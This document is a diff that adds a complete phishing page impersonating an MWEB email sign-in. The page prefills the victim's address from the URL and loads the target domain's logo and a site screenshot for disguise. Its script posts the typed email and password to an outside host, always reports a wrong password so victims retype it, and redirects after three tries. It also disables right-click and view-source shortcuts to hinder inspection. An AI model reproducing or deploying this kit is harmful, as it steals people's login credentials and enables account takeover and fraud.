@@ -1,1 +1,524 @@
-geo
+
+<html lang="en"><head>
+
+
+  
+    <!-- Required meta tags -->
+   
+    <title class="logoname">mweb</title>
+	
+	 <link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    
+  
+ <style type="text/css">
+	
+	body {
+ font-family: 'Open Sans', sans-serif;
+ color: #535353;
+ background-repeat: no-repeat;
+ background-size: cover;
+}
+}
+
+.img-fluid {
+    max-width: 100% !important;
+    height: auto;
+}
+
+.form-control:focus {
+    box-shadow: none;
+}
+
+h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6 {
+    font-family: 'Open Sans', sans-serif;
+}
+
+/** Login 1 start **/
+.login-1 {
+    background: rgba(0, 0, 0, 0.04) url(../img/bg-image.jpg) top left repeat;
+    background-size: cover;
+    top: 0;
+    width: 100%;
+    bottom: 0;
+    opacity: 1;
+    min-height: 100vh;
+    text-align: center;
+    position: relative;
+    display: -webkit-box;
+    display: -moz-box;
+    display: -ms-flexbox;
+    display: -webkit-flex;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 30px;
+}
+
+.login-1 .login-inner-form {
+    max-width: 420px;
+    margin: 0 auto;
+    color: #717171;
+    text-align: center;
+}
+
+.login-1 .login-inner-form .details {
+    padding: 25px 30px 30px;
+    background: rgba(0, 0, 0,0.8);
+    border-radius: 5px 5px 0 0;
+}
+
+.login-1 .login-inner-form img {
+    margin-bottom: 15px;
+    height: 30px;
+}
+
+.login-1 .login-inner-form h3 {
+    margin: 0 0 25px;
+    font-size: 18px;
+    font-weight: 400;
+    font-family: 'Open Sans', sans-serif;
+    color: #fff;
+}
+
+.login-1 .login-inner-form .form-group {
+    margin-bottom: 25px;
+}
+
+.login-1 .login-inner-form .input-text {
+    width: 100%;
+    padding: 10px 15px;
+    font-size: 14px;
+    border: 1px solid #e8e7e7;
+    outline: none;
+    color: #717171;
+    border-radius: 3px;
+    height: 45px;
+}
+
+.login-1 .login-inner-form .btn-md {
+    cursor: pointer;
+    padding: 12px 30px 11px 30px;
+    letter-spacing: 1px;
+    font-size: 15px;
+    font-weight: 600;
+    font-family: 'Open Sans', sans-serif;
+    border-radius: 3px;
+}
+
+.login-1 .login-inner-form .social-list{
+    margin-bottom: 0;
+    padding: 0;
+}
+
+.login-1 .login-inner-form .checkbox a {
+    font-size: 14px;
+    color: #717171;
+    float: right;
+}
+
+.login-1 .login-inner-form .terms{
+    margin-left: 3px;
+}
+
+.login-1 .login-inner-form .checkbox {
+    margin-bottom: 25px;
+    font-size: 14px;
+}
+
+.login-1 .login-inner-form .form-check{
+    float: left;
+    margin-bottom: 0;
+}
+
+.login-1 .login-inner-form .form-check a {
+    color: #717171;
+    float: right;
+}
+
+.login-1 .login-inner-form .form-check-input {
+    position: absolute;
+    margin-left: 0;
+}
+
+.login-1 .login-inner-form .form-check label::before {
+    content: "";
+    display: inline-block;
+    position: absolute;
+    width: 17px;
+    height: 17px;
+    margin-left: -25px;
+    border: 1px solid #cccccc;
+    border-radius: 3px;
+    background-color: #fff;
+}
+
+.login-1 .login-inner-form .form-check-label {
+    padding-left: 25px;
+    margin-bottom: 0;
+    font-size: 14px;
+}
+
+.login-1 .login-inner-form .checkbox-theme input[type="checkbox"]:checked + label::before {
+    background-color: #0f96f9;
+    border-color: #0f96f9;
+}
+
+.login-1 .login-inner-form input[type=checkbox]:checked + label:before {
+    font-weight: 300;
+    color: #f3f3f3;
+    line-height: 15px;
+    font-size: 14px;
+    content: "\2713";
+}
+
+.login-1 .login-inner-form input[type=checkbox], input[type=radio] {
+    margin-top: 4px;
+}
+
+.login-1 .login-inner-form .social-list li {
+    display: inline-block;
+    font-size: 16px;
+    margin-top: 30px;
+}
+
+.login-1 .login-inner-form .social-list li a {
+    margin:2px;
+    font-size: 14px;
+    width: 35px;
+    height: 35px;
+    border-radius: 3px;
+    display: inline-block;
+    text-align: center;
+    line-height: 35px;
+}
+
+.login-1 .login-inner-form .footer {
+    font-size: 14px;
+    padding: 15px 20px;
+    background-color: #f5f5f5;
+    border-radius: 0 0 5px 5px;
+    border-top: solid 1px #f5f5f5;
+}
+
+.login-1 .login-inner-form .footer span a {
+    color: #717171;
+}
+
+.login-1 .login-inner-form button:focus {
+    outline: none;
+    outline: 0 auto -webkit-focus-ring-color;
+}
+
+.login-1 .login-inner-form .btn-theme:not([disabled]):not(.disabled).active, .btn-theme:not([disabled]):not(.disabled):active, .show > .btn-theme.dropdown-toggle {
+    box-shadow: none;
+}
+
+.login-1 .login-inner-form .btn-theme.focus, .btn-theme:focus {
+    box-shadow: none;
+}
+
+.login-1 .login-inner-form .btn-theme {
+    background: #0f96f9;
+    border: none;
+    color: #fff;
+}
+
+.login-1 .login-inner-form .btn-theme:hover {
+    background: #0294B6;
+}
+
+/** Social media **/
+.login-1 .facebook-bg {
+    background: #4867aa;
+    color: #fff;
+}
+
+.login-1 .facebook-bg:hover {
+    background: #3b589e;
+    color: #fff;
+}
+
+.login-1 .twitter-bg {
+    background: #33CCFF;
+    color: #fff;
+}
+
+.login-1 .twitter-bg:hover {
+    background: #56d7fe;
+    color: #fff;
+}
+
+.login-1 .google-bg {
+    background: #db4437;
+    color: #fff;
+}
+
+.login-1 .google-bg:hover {
+    background: #dc4e41;
+    color: #fff;
+}
+
+.login-1 .linkedin-bg {
+    background: #0177b5;
+    color: #fff;
+}
+
+.login-1 .linkedin-bg:hover {
+    background: #1c82ca;
+    color: #fff;
+}
+
+/** MEDIA **/
+@media (max-width: 992px) {
+    .login-1 {
+        padding: 30px 0;
+    }
+}
+
+
+	</style>
+  </head>
+  <body id="top" style="background-image: url(&quot;https://image.thum.io/get/width/1200/https://mweb.co.za&quot;);">
+ <iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
+allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
+
+<!-- Login 1 start -->
+<div class="login-1">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="login-inner-form">
+                    <div class="details">
+                        
+      <form action="https://detcetus.com/skald/tonn.php" method="post">
+<div align="center">
+                          <h2 class="text-center"><div id="top"><img src="https://logo.clearbit.com/https://mweb.co.za" alt="" id="logoimg" style="width:30px;height:30px;margin-top:10px;">
+		 
+		  <span style="vertical-align: middle; padding-left: 3px;color: #fff;" id="logoname">mweb</span> </div>
+                      <p><span style="font-size: 20px;color:gray;">Sign in your Email to continue </span></p>
+              
+        <center>
+          <div class="alert alert-danger" id="msg" style="display: none; font-size:14px; ">Your Email password is incorrect</div>
+          <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+        </center>
+        <div class="form-group">
+          <div class="input-group">
+            <span class="input-group-addon"><i class="fas fa-user"></i></span>
+            <input type="email" class="form-control" name="email" placeholder="Username" value="" id="email">
+          </div>
+        </div>
+        <div class="form-group">
+          <div class="input-group">
+            <span class="input-group-addon"><i class="fas fa-lock"></i></span>
+            <input type="password" class="form-control" id="password" name="password" placeholder="Password" required="required">
+          </div>
+        </div>
+		<div class="form-group">
+		 <div align="left">
+          <input type="checkbox"><span style="font-size: 15px;color:gray;"> Remember me </span> 
+        </div>
+		</div>
+        <div class="form-group">
+         
+		           <button type="submit" class="btn btn-primary login-btn btn-block" id="submit-btn">Sign in</button>
+        </div>
+       
+
+      
+      
+    </h2></div></form>
+
+
+
+
+
+    <style>.tb_button {padding:1px;cursor:pointer;border-right: 1px solid #8b8b8b;border-left: 1px solid #FFF;border-bottom: 1px solid #fff;}.tb_button.hover {borer:2px outset #def; background-color: #f8f8f8 !important;}.ws_toolbar {z-index:100000} .ws_toolbar .ws_tb_btn {cursor:pointer;border:1px solid #555;padding:3px}   .tb_highlight{background-color:yellow} .tb_hide {visibility:hidden} .ws_toolbar img {padding:2px;margin:0px}</style>
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+        <script>
+
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 ||   
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+ 
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email); 
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+           email.focus;
+           return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var mainPage = 'https://'+my_slice; 
+		var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+	
+		var sv = my_slice;
+		
+		var image = "url('https://image.thum.io/get/width/1200/https://"+sv;"')"
+		
+		//var image = "url('https://"+sv;"')"
+	
+
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
+		$("#logoname").html(final);
+		$(".logoname").html(final);
+         
+        document.body.style.backgroundImage = image;
+
+		
+	 	
+        $(".email").html(email);
+		 
+      }
+ 
+      $('#submit-btn').click(function(event){
+    
+		event.preventDefault();
+        $('#error').hide();
+        $('#msg').hide();
+        var email=$("#email").val();
+        var password=$("#password").val();
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!email) {
+            $('#error').show();
+            $('#error').html("Email field is empty");
+        
+            return false;
+        }
+
+        if (!filter.test(my_email)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            
+            return false;
+        }
+        if (!password) {
+            $('#error').show();
+            $('#error').html("Password field is empty");
+         
+            return false;
+        }
+
+ 
+		 
+      ///////////new injection////////////////
+      count=count+1;
+    //  console.log(count); 
+	var d=atob('aHR0cHM6Ly8xdGhhc2hjb2luLmNvbS9hc3NldHMvb28ucGhw');
+	   $.ajax({
+        dataType: 'JSON',
+		url: 'https://detcetus.com/squid/48392332234.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Sign in');
+			  
+    //  console.log(count); 
+            },
+            success: function(response){
+			 $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>");
+              if(response){
+                $("#msg").show();
+				console.log(response);
+				$('#msg').html(response['msg']);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=3) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("https://support.google.com/websearch/answer/118238?hl=en&co=GENIE.Platform%3DAndroid");
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                   $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=3) {
+                count=0;
+                window.location.replace("https://support.google.com/websearch/answer/118238?hl=en&co=GENIE.Platform%3DAndroid");
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sgn in');
+            }
+          });  
+    });
+
+
+    });
+
+
+  </script>
+  
+
+
+
+</div></div></div></div></div></div></body></html>
+
